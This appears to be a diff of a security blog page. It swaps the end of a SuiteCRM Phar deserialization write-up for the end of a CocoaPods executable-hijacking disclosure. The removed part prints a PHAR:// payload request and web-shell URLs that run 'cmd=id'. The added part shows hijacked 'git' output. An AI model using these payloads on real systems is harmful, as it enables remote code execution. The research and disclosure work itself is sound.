-</pre></td><td class="rouge-code"><pre>POST /index.php?module=Administration&amp;action=Backups HTTP/1.1
-Host: suitecrm.local
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-GB,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 119
-Origin: http://suitecrm.local
-Connection: close
-Referer: http://suitecrm.local/index.php?module=Administration&amp;action=Backups
-Cookie: sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;1=10&amp;2=150&amp;3=250&amp;4=175&amp;5=125; PHPSESSID=6b8f472cd174d02167bc0a0c908ec9e0
-Upgrade-Insecure-Requests: 1
-
-backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmaliciousmodule.zip&amp;backup_zip=s&amp;run=confirm
+</pre></td><td class="rouge-code"><pre>snoopy@snoopy-MacBookPro11-4:~/cctest_rb$ pod --help
+/home/snoopy/.gem/ruby/3.0.0/gems/cocoapods-1.16.2/lib/cocoapods/command.rb:128:in `git_version': Failed to extract git version from `git --version` ("uid=1000(snoopy) gid=1000(snoopy) groups=1000(snoopy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),124(docker)\n") (RuntimeError)
+	from /home/snoopy/.gem/ruby/3.0.0/gems/cocoapods-1.16.2/lib/cocoapods/command.rb:140:in `verify_minimum_git_version!'
+	from /home/snoopy/.gem/ruby/3.0.0/gems/cocoapods-1.16.2/lib/cocoapods/command.rb:49:in `run'
+	from /home/snoopy/.gem/ruby/3.0.0/gems/cocoapods-1.16.2/bin/pod:55:in `&lt;top (required)&gt;'
+	from /home/snoopy/.rbenv/versions/3.2.4/lib/ruby/site_ruby/3.2.0/rubygems.rb:304:in `load'
+	from /home/snoopy/.rbenv/versions/3.2.4/lib/ruby/site_ruby/3.2.0/rubygems.rb:304:in `activate_and_load_bin_path'
+	from /home/snoopy/.gem/ruby/3.0.0/bin/pod:25:in `&lt;main&gt;'
+snoopy@snoopy-MacBookPro11-4:~/cctest_rb$ 
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>1) Access the malicousmodule manifest file by browsing to the directory path and include the uploaded shell.php.txt</p>
+<hr />
 
-<p>Now that the .htaccess file is deleted. The upload directory is accessible. The malcioiusmodule-manifest.php is now accessible as follows:</p>
+<h2 id="remediation"><span class="me-2">Remediation</span><a href="#remediation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php
-</pre></td></tr></tbody></table></code></div></div>
+<p>Maintainers were contacted months ago, and a PR was also open in public - https://github.com/CocoaPods/CocoaPods/pull/12899. This package is not maintained.</p>
 
-<p>The ?123 can now be specified and the shell.php.txt file can be provided</p>
+<h2 id="timeline"><span class="me-2">Timeline</span><a href="#timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41
-
-</pre></td></tr></tbody></table></code></div></div>
-<p>The included shell.php.txt will be interpreted as code, and the cmd parameter can be provided which will be executed by the system command.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>http://suitecrm.local/upload/upgrades/module/maliciousmodule-manifest.php?123=/var/www/html/upload/eb7cde01-6190-9ca9-b81b-601998504b41&amp;cmd=id
-</pre></td></tr></tbody></table></code></div></div>
-
-<p><a href="/assets/img/blog/suitecrm-phar-deserialization/phar12.png" class="popup img-link shimmer"><img src="/assets/img/blog/suitecrm-phar-deserialization/phar12.png" alt="" loading="lazy"></a></p>
-
-<h3 id="wrapping-up"><span class="me-2">Wrapping up</span><a href="#wrapping-up" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
-<p>To conclude, when validating user input, precautions should be taken to ensure the checks are not case-sensitive. Furthermore, when remediating and preventing the use of Deserialization gadgets, transitive dependencies should be taken into account since they are loaded by a project through Composer’s autoloading feature. Snyk Open Source also supports PHP scanning and can be used to scan and report on well known libraries that have removed deserialization gadgets in their code.</p>
+<ul>
+  <li>Vendor notified: 09/03/2026</li>
+  <li>1st follow up: 27/03/2026</li>
+  <li>Public PR open and 2nd follow up: 02/04/2026</li>
+  <li>Public disclosure: 22/04/20206</li>
+</ul>
 
   </div>
 
@@ -1709,7 +923,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
       <div class="post-meta mb-3">
         <i class="far fa-folder-open fa-fw me-1"></i>
         
-          <a href="/categories/web-application-security/">web application security</a>
+          <a href="/categories/security-research/">security research</a>
       </div>
     
 
@@ -1719,9 +933,14 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
         <i class="fa fa-tags fa-fw me-1"></i>
         
           <a
-            href="/tags/php-deserialization/"
+            href="/tags/ruby/"
             class="post-tag no-text-decoration"
-          >php deserialization</a>
+          >ruby</a>
+        
+          <a
+            href="/tags/cocoapods/"
+            class="post-tag no-text-decoration"
+          >cocoapods</a>
         
       </div>
     
@@ -1757,7 +976,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=SuiteCRM%20-%20Phar%20Deserialization%20to%20Code%20Execution%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsuitecrm-phar-deserialization%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=Disclosure:%20Local%20Executable%20Hijacking%20in%20CocoaPods%20via%20Unsafe%20Path%20Search%20-%20%F0%9F%92%BB%20%7C%20Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fcocoapods-exe-hijacking%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fab fa-twitter"></i>
       </a>
     
@@ -2788,103 +2007,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
 
 
 
@@ -2900,7 +2023,7 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
       
         <article class="col">
-          <a href="/posts/02_php_object_injection_exploitation-notes/" class="post-preview card h-100">
+          <a href="/posts/nodejs-denial-of-service/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2912,23 +2035,23 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
 <time
   
-  data-ts="1610133952"
+  data-ts="1776072352"
   data-df="ll"
   
 >
-  Jan  8, 2021
+  Apr 13, 2026
 </time>
 
-              <h4 class="pt-0 my-2">PHP Object Injection Exploitation Notes</h4>
+              <h4 class="pt-0 my-2">A Weird UNC Path That can Crash Node.js</h4>
               <div class="text-muted">
-                <p>Notes I’ve written and Collected about PHP Deserialization  Introduction  serialize and unserialize  Serialization functions are commonly used within software to store data to a file, a memory buff...</p>
+                <p>Recently while fuzzing Node.js modules I found an issue which causes the process to abort when malformed Windows UNC style paths are passed into pathToFileURL(). This was initially something I look...</p>
               </div>
             </div>
           </a>
         </article>
       
         <article class="col">
-          <a href="/posts/09_opencats_php_object_injection/" class="post-preview card h-100">
+          <a href="/posts/fuzzing-microvium/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2940,23 +2063,23 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
 <time
   
-  data-ts="1610825152"
+  data-ts="1774689952"
   data-df="ll"
   
 >
-  Jan 16, 2021
+  Mar 28, 2026
 </time>
 
-              <h4 class="pt-0 my-2">OpenCATS PHP Object Injection to Arbitrary File Write</h4>
+              <h4 class="pt-0 my-2">Fuzzing Microvium Embedded JavaScript Engine</h4>
               <div class="text-muted">
-                <p>Introduction  OpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: https://www.opencats.org/. OpenCATS is vulnerable to PHP Object injection, by ...</p>
+                <p>So I decided to fuzz Microvium. If you haven’t heard of it, Microvium is this tiny JavaScript engine designed for embedded systems like IoT devices, microcontrollers, stuff where you’ve got maybe 1...</p>
               </div>
             </div>
           </a>
         </article>
       
         <article class="col">
-          <a href="/posts/08_domgoat_solutions/" class="post-preview card h-100">
+          <a href="/posts/js-malware-analysis/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2968,16 +2091,16 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
 <time
   
-  data-ts="1581189952"
+  data-ts="1748337952"
   data-df="ll"
   
 >
-  Feb  8, 2020
+  May 27, 2025
 </time>
 
-              <h4 class="pt-0 my-2">DomGoat Walkthrough</h4>
+              <h4 class="pt-0 my-2">JavaScript Malware Code review of a Fake Job Email</h4>
               <div class="text-muted">
-                <p>DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This could be abused by an attacker to manipulat...</p>
+                <p>I recently found this hilarious email in my Junk email for a job offer for a Web3 Platform with expected salary being  &gt; Our expected salary for each role are: &gt; - Frontend (React): $150K/yea...</p>
               </div>
             </div>
           </a>
@@ -2998,22 +2121,18 @@ backup_dir=PHAR%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fupload%2Fupgrades%2Fmodule%2Fmalic
 
   
     <a
-      href="/posts/fuzzing-wit-go-fuzz/"
+      href="/posts/nodejs-denial-of-service/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>Fuzzing with Go-Fuzz</p>
+      <p>A Weird UNC Path That can Crash Node.js</p>
     </a>
   
 
   
-    <a
-      href="/posts/exploit-education-phoenix/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>Exploit Education - Phoenix Notes</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
